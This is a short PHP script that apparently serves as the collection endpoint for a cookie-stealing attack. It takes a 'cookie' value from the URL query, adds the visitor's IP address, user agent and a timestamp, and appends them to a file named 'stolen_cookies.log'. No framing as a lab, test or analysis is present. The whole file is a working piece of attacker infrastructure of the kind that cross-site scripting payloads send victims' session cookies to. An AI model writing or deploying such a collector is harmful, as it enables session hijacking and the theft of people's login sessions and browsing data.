<?php
$log = 'stolen_cookies.log';
$ip = $_SERVER['REMOTE_ADDR'];
$ua = $_SERVER['HTTP_USER_AGENT'];
$cookie = isset($_GET['cookie']) ? $_GET['cookie'] : 'none';
$time = date('Y-m-d H:i:s');

file_put_contents($log, "[$time] $ip | $ua | $cookie\n", FILE_APPEND);
echo "ok";
?>
